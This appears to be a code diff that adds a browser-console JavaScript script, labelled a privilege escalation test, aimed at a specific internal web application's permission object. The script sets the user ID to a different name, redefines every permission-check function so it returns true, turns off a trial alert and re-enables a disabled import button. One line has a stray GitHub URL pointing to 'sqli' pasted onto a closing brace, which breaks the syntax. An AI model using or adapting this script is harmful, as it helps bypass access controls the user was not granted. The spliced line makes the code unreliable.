@@ -7,3 +7,79 @@ aip_clientlink_docs.wlima.view.LiMAResource.trialAlert = function() {
 
 var currentUser = aip_clientlink_docs.wlima.view.LiMAResource.userInfo.userId;
 console.log("Current User:", currentUser);
+
+
+(function testPrivilegeEscalation() {
+    console.log("=".repeat(50));
+    console.log("PRIVILEGE ESCALATION TEST");
+    console.log("=".repeat(50));
+    
+    var resource = aip_clientlink_docs.wlima.view.LiMAResource;
+    
+    // Step 1: Record original state
+    console.log("ORIGINAL STATE:");
+    console.log("User ID:", resource.userInfo.userId);
+    console.log("canDoAllocation:", resource.canDoAllocation());
+    console.log("canDoEIC:", resource.canDoEIC());
+    console.log("trialAlert:", resource.trialAlert());
+    
+    // Step 2: Modify user ID
+    console.log("\nSTEP 1: Modifying user ID to 'sharpprav'");
+    resource.userInfo.userId = 'sharpprav';
+    
+    // Step 3: Create/modify rights
+    console.log("STEP 2: Setting all permissions to 0");
+    if (!resource.userInfo.myrights) resource.userInfo.myrights = {};
+    resource.userInfo.myrights.psguser = 0;
+    resource.userInfo.myrights.capuser = 0;
+    resource.userInfo.myrights.alloc = 0;
+    resource.userInfo.myrights.eic = 0;
+    resource.userInfo.myrights.capacity_maint = 0;
+    
+    // Step 4: Override functions
+    console.log("STEP 3: Overriding permission functions");
+    resource.isPSGUser = function() { return true; };
+    resource.isCAPUser = function() { return true; };
+    resource.canDoAllocation = function() { 
+        console.log("Bypassed canDoAllocation check");
+        return true; 
+    };
+    resource.canDoEIC = function() { return true; };
+    resource.canDoAllocationReport = function() { return true; };
+    resource.canDoCapacity = function() { return true; };
+    resource.trialAlert = function() { 
+        console.log("Bypassed trialAlert check");
+        return false; 
+    };https://github.com/makkenaravi944163/makk/blob/main/sqli
+    
+    // Step 5: Test new state
+    console.log("\nMODIFIED STATE:");
+    console.log("User ID:", resource.userInfo.userId);
+    console.log("canDoAllocation:", resource.canDoAllocation());
+    console.log("canDoEIC:", resource.canDoEIC());
+    console.log("trialAlert:", resource.trialAlert());
+    
+    // Step 6: Check import button
+    console.log("\nSTEP 4: Looking for import button");
+    var importBtn = null;
+    Ext.ComponentQuery.query('button').forEach(function(btn) {
+        if (btn.text && btn.text.toLowerCase().includes('import')) {
+            importBtn = btn;
+            console.log("Found import button:", btn.text);
+            console.log("Button disabled:", btn.disabled);
+            
+            // Try to enable if disabled
+            if (btn.disabled) {
+                btn.setDisabled(false);
+                console.log("Button enabled!");
+            }
+        }
+    });
+    
+    console.log("\n" + "=".repeat(50));
+    console.log("TEST COMPLETE - Try clicking import now");
+    console.log("If server validates, you may still get permission errors");
+    console.log("=".repeat(50));
+    
+    return "Privilege escalation test complete";
+})();
